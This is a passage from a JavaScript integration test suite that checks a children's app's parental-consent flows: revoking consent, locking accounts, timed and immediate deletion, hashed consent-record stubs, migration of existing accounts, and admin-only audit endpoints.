    // ── revoke ─────────────────────────────────────────────────────────────
    console.log('\nRevoke and delete');
    r = await parent.post(`/api/consent/parent/children/${rec.id}/revoke`, {});
    check('the parent withdraws consent', r.status === 200 && !!r.json.delete_after);
    r = await kid.get('/api/auth/me');
    check('the child account is locked', r.json.user.consent.state === 'revoked' && r.json.user.consent.locked === true);
    r = await kid.get('/api/catalog');
    check('a locked account reaches nothing but sign-in and consent', r.status === 403 && r.json.code === 'consent_revoked');
    r = await kid.post('/api/sessions', { enrollment_id: 1 });
    check('...including starting a session (no new collection)', r.status === 403);
    r = await kid.get('/dashboard');
    check('...and its pages refuse camera and microphone', /camera=\(\)/.test(r.headers.get('permissions-policy')));
    r = await parent.post(`/api/consent/parent/children/${rec.id}/consent`, { notice_version: noticeVersion, i_am_parent: true });
    check('the parent can give consent again', r.status === 200);
    r = await kid.get('/api/catalog');
    check('...and the account opens again', r.status === 200);
    await parent.post(`/api/consent/parent/children/${rec.id}/revoke`, {});
    r = await adult.post('/api/consent/admin/sweep', { at: new Date(Date.now() + 31 * 24 * 3600 * 1000).toISOString() });
    check('a revoked account is deleted after 30 days', r.json.revoked_deleted >= 1, r.json);
    r = await kid.get('/api/auth/me');
    check('...and the child is signed out (account gone)', r.json.user === null);
    r = await adult.get(`/api/consent/admin/rows/${kidUser.id}`);
    check('...with no row left for the child anywhere (deletion audit)', r.status === 200 && r.json.total === 0, r.json);
    const stub = (await adult.get(`/api/consent/admin/records/${rec.id}`)).json.record;
    check('...and the consent record is a stub: no parent email, a hash of it, the dates and method', stub && stub.parent_email === null
      && /^[0-9a-f]{64}$/.test(stub.parent_email_sha256 || '') && stub.granted && stub.granted.method === 'email_plus' && !!stub.deleted_at, stub);

    // Parent deletion, immediate.
    const kidB = makeClient(base);
    await kidB.post('/api/consent/age', { birth_year: kidYear, birth_month: 3, country: 'GB' });
    r = await kidB.post('/api/auth/register', { username: 'kid_b', password: 'kidpass123', display_name: 'Bee', parent_email: 'parent.one@example.test' });
    check('a second child signs up with the same parent', r.status === 201);
    const kidBId = r.json.user.id;
    await kidB.post('/api/profile/style-quiz', { answers: { q1: 'a' } });
    await kidB.post('/api/profile/survey', {});
    r = await adult.get(`/api/consent/admin/rows/${kidBId}`);
    check('the deletion audit sees the child\'s rows before deletion', r.json.total >= 2, r.json);
    const tokenB = tokenOf(lastMail(outbox, 'consent-request', 'parent.one@example.test'));
    r = await parent.get(`/api/consent/request/${tokenB}`);
    check('the existing parent account is recognised (signed in)', r.json.signed_in_as_this_parent === true, r.json);
    r = await parent.post(`/api/consent/request/${tokenB}`, { decision: 'agree', notice_version: noticeVersion, i_am_parent: true });
    check('a signed-in parent agrees without a password', r.status === 200, r.json);
    me = (await parent.get('/api/consent/parent/me')).json;
    const recB = me.children.find((c) => c.child && c.child.username === 'kid_b');
    r = await parent.post(`/api/consent/parent/children/${recB.id}/delete`, { confirm: 'delete it' });
    check('deletion needs the word DELETE', r.status === 400);
    r = await parent.post(`/api/consent/parent/children/${recB.id}/delete`, { confirm: 'DELETE' });
    check('the parent deletes the child account at once', r.status === 200 && r.json.removed.users === 1, r.json);
    r = await adult.get(`/api/consent/admin/rows/${kidBId}`);
    check('...and every row of it is gone (deletion audit)', r.json.total === 0, r.json);
    r = await parent.post('/api/consent/parent/delete-account', {});
    check('with no children left, the parent can close their own account', r.status === 200);

    // Declining, and the 14-day expiry.
    const kidC = makeClient(base);
    await kidC.post('/api/consent/age', { birth_year: kidYear, birth_month: 3, country: 'US' });
    r = await kidC.post('/api/auth/register', { username: 'kid_c', password: 'kidpass123', display_name: 'Cee', parent_email: 'parent.c@example.test' });
    const tokenC = tokenOf(lastMail(outbox, 'consent-request', 'parent.c@example.test'));
    r = await makeClient(base).post(`/api/consent/request/${tokenC}`, { decision: 'decline' });
    check('a parent who does not agree deletes the account at once', r.status === 200 && r.json.decision === 'declined');
    r = await kidC.get('/api/auth/me');
    check('...and the child is signed out', r.json.user === null);

    const kidD = makeClient(base);
    await kidD.post('/api/consent/age', { birth_year: kidYear, birth_month: 3, country: 'NL' });
    r = await kidD.post('/api/auth/register', { username: 'kid_d', password: 'kidpass123', display_name: 'Dee', parent_email: 'parent.d@example.test' });
    const kidDId = r.json.user.id;
    r = await kidD.post('/api/consent/child/request', {});
    check('the child can send the request again', r.status === 200 && /p\*+@example\.test/.test(r.json.parent_email), r.json);
    r = await adult.post('/api/consent/admin/sweep', { at: new Date(Date.now() + 15 * 24 * 3600 * 1000).toISOString() });
    check('an unanswered request is deleted after 14 days', r.json.expired >= 1, r.json);
    let stubD = null;
    for (let id = 1; id < 20 && !stubD; id++) {
      const one = await adult.get(`/api/consent/admin/records/${id}`);
      if (one.status === 200 && one.json.record.child_user_id === kidDId) stubD = one.json.record;
    }
    r = await adult.get(`/api/consent/admin/rows/${kidDId}`);
    check('...with the child account and the parent email', r.json.total === 0 && stubD && stubD.status === 'expired' && stubD.parent_email === null, stubD);
    r = await kid.get('/api/consent/admin/rows/1');
    check('the proof endpoints are admin-only', r.status === 404);

    // ── existing accounts: asked on next sign-in ───────────────────────────
    console.log('\nExisting accounts (migration)');
    const old = makeClient(base);
    r = await old.post('/api/auth/login', { email: 'old-kid@example.test', password: 'old-password-1' });
    check('an account from before the screen signs in and is told to answer', r.status === 200 && r.json.user.age_needed === true && r.json.user.consent.state === 'needs_age', r.json && r.json.user);
    r = await old.get('/dashboard');
    check('...camera and microphone off until it does', /camera=\(\)/.test(r.headers.get('permissions-policy')));
    r = await old.post('/api/items/1/coach', { messages: [] });
    check('...and outside AI refused until it does', r.status === 403 && r.json.code === 'age_needed');
    r = await old.post('/api/consent/age', { birth_year: kidYear, birth_month: 2, country: 'US' });
    check('it answers as a 10-year-old: parent route', r.json.route === 'parent');
    r = await old.get('/api/auth/me');
    check('...the account is now a pending child account with no request yet', r.json.user.consent.state === 'pending' && r.json.user.consent.has_request === false && r.json.user.account_type === 'child', r.json.user);
    r = await old.post('/api/consent/age', { birth_year: adultYear, birth_month: 2, country: 'US' });
    check('...and cannot change the answer', r.json.route === 'parent' && r.json.locked === true);
    r = await old.post('/api/consent/child/request', { parent_email: 'old.parent@example.test' });
    check('...it gives a parent email and the request goes out', r.status === 200 && !!lastMail(outbox, 'consent-request', 'old.parent@example.test'));
    const oldA = makeClient(base);
    await oldA.post('/api/auth/login', { email: 'old-adult@example.test', password: 'old-password-1' });
    r = await oldA.post('/api/consent/age', { birth_year: adultYear, birth_month: 2, country: 'GB' });
    r = await oldA.get('/api/auth/me');
    check('an existing adult answers and has full access', r.json.user.consent.state === 'full' && r.json.user.age_needed === false);

    // A register call with no age at all (an old client) makes a needs-age account.
    const api = makeClient(base);
    r = await api.post('/api/auth/register', { email: 'noage@example.test', password: 'password123', display_name: 'No Age' });
    check('a sign-up with no age answer is treated as needing one', r.status === 201 && r.json.user.age_needed === true, r.json);
  } catch (err) {
    console.log(`  server log (tail):\n${server.log().slice(-3000)}`);
    throw err;
  } finally {
    if (failures) console.log(`  server exit code: ${server.child.exitCode}`);
    server.child.kill();
    await new Promise((res) => setTimeout(res, 300));
    try { fs.rmSync(work, { recursive: true, force: true }); } catch { /* temp */ }
  }
}

(async () => {
  noUploadBuildTest();
  // The unit part loads the consent module on a throwaway store, read-only.
  const scratch = path.join(os.tmpdir(), `consent-unit-${process.pid}.json`);
  fs.writeFileSync(scratch, JSON.stringify({ _counters: {} }));
  process.env.DB_FILE = scratch;
  process.env.DB_READONLY = '1';
  process.env.CONSENT_SWEEP = 'off';
  const consent = ageUnitTests();
  process.on('exit', () => { try { fs.unlinkSync(scratch); } catch { /* gone */ } });
  try {
    await serverTests(consent);
  } catch (err) {
    failures++;
    console.log(`  FAIL server tests threw: ${err.stack || err.message}`);
  }
  console.log(`\n${failures ? `${failures} FAILED` : 'All consent checks passed'}${warnings ? `, ${warnings} warning(s)` : ''}.`);
  process.exit(failures ? 1 : 0);
})();
